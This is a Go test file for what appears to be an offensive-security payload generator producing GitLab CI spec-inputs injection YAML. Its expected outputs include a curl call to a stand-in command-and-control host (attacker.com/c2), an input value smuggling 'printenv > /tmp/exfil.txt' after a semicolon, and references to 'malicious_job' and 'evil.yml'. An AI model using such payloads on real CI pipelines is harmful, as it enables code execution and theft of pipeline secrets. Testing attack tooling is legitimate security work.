package payloads

import (
	"strings"
	"testing"
)

func TestGenerateSpecInputsInjectionYAML(t *testing.T) {
	tests := []struct {
		name     string
		opts     SpecInputsOptions
		contains []string
		absent   []string
	}{
		{
			name: "default script injection",
			opts: SpecInputsOptions{},
			contains: []string{
				"include:",
				"component:",
				"inputs:",
				"environment:",
				"curl http://attacker.com/c2",
				"allow_failure: true",
			},
		},
		{
			name: "yaml key injection",
			opts: SpecInputsOptions{
				InjectionType: "yaml-key",
			},
			contains: []string{
				"malicious_job",
			},
		},
		{
			name: "include injection",
			opts: SpecInputsOptions{
				InjectionType: "include",
			},
			contains: []string{
				"evil.yml",
			},
		},
		{
			name: "custom template and key",
			opts: SpecInputsOptions{
				InputKey:       "deploy_target",
				TargetTemplate: "gitlab.com/acme/ci-lib@v2",
				MaliciousValue: "staging; printenv > /tmp/exfil.txt #",
			},
			contains: []string{
				"gitlab.com/acme/ci-lib@v2",
				"deploy_target:",
				"printenv > /tmp/exfil.txt",
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			y := GenerateSpecInputsInjectionYAML(tc.opts)
			for _, s := range tc.contains {
				if !strings.Contains(y, s) {
					t.Errorf("expected %q in output:\n%s", s, y)
				}
			}
			for _, s := range tc.absent {
				if strings.Contains(y, s) {
					t.Errorf("unexpected %q in output:\n%s", s, y)
				}
			}
			_ = mustParse(t, y)
		})
	}
}
